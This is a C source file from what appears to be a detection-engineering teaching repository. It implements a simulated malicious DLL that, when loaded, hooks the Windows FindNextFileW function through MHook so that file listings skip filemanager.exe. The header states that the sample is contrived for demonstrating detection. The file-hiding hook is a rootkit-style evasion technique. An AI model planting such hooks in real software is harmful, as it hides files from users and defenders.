/*
 *  This file contains a simulated malicious DLL that hooks the FindNextFileW
 *  function to hide the presence of filemanager.exe. 
 *
 *  This sample file is intended for use to demonstrate detection engineering
 *  principles and would serve no purpose in a real world engagment. All of the
 *  functionality of this program is contrived, FindNextFileW isn't used internally
 *  by Windows to enumerate files, so this malicious DLL included doesn't actually
 *  hide it's presence.
 *
 *  https://github.com/NWc0de/DetectionEngineeringDemo
 *
 *  This file is part of version 1: basic methodology.
 *
 *  Spencer Litte - mrlittle@uw.edu
 */



#include "pch.h"
#include <mhook-lib/mhook.h>

const wchar_t* HIDDEN = L"filemanager.exe";

typedef BOOL(WINAPI* PFNF)(
    _In_ HANDLE hFindFile,
    _Out_ LPWIN32_FIND_DATAW lpFindFileData
    );

PFNF OriginalFindNextFileW = (PFNF)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "FindNextFileW");

/*
 * A simple wrapper for FindNextFileW that hides the precense of the url 
 * HIDDEN (in this case filemanager.exe). The argument and return structures
 * mirrors FindNextFileW otherwise. 
 * 
 * https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findnextfilew
 */
BOOL WINAPI FindNextFileHooked(
    _In_ HANDLE file_handle,
    _Out_ LPWIN32_FIND_DATAW file_struct
)
{
    BOOL success;
    do {
        success = OriginalFindNextFileW(file_handle, file_struct);
    } while (success && !wcscmp(HIDDEN, file_struct->cFileName)); 
    return success;
}

/*
 * Use MHook to hook the FindNextFileW function when this DLL is loaded.
 */
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Mhook_SetHook((PVOID*) &OriginalFindNextFileW, FindNextFileHooked);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

